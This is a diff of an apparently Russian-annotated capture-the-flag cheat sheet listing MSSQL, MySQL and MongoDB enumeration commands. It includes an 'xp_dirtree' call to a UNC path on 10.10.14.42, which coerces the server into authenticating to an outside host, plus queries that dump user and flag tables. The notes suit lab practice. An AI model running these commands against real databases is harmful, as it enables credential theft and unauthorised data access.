@@ -126,15 +126,23 @@ xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аут�
 exec xp_dirtree 'c:/';
 
 ********************
-select name from sys.databases;  (перечислить все базы данных)
+   
+       enum_db
+       USE flagDB;
+       SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = 'flagDB';
+       SELECT * FROM tb_flag;
 
-select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;
 
-select * from ScrambleHR.dbo.Employees; (выбрать все из таблицы ScramblerHR)
+       
+       select name from sys.databases;  (перечислить все базы данных)
 
-select * from wp_users \G (в удобном виде)
+       select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;
 
-describe wp_users; (описать таблицу)
+        select * from ScrambleHR.dbo.Employees; (выбрать все из таблицы ScramblerHR)
+
+        select * from wp_users \G (в удобном виде)
+
+        describe wp_users; (описать таблицу)
 
 # mongodb
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
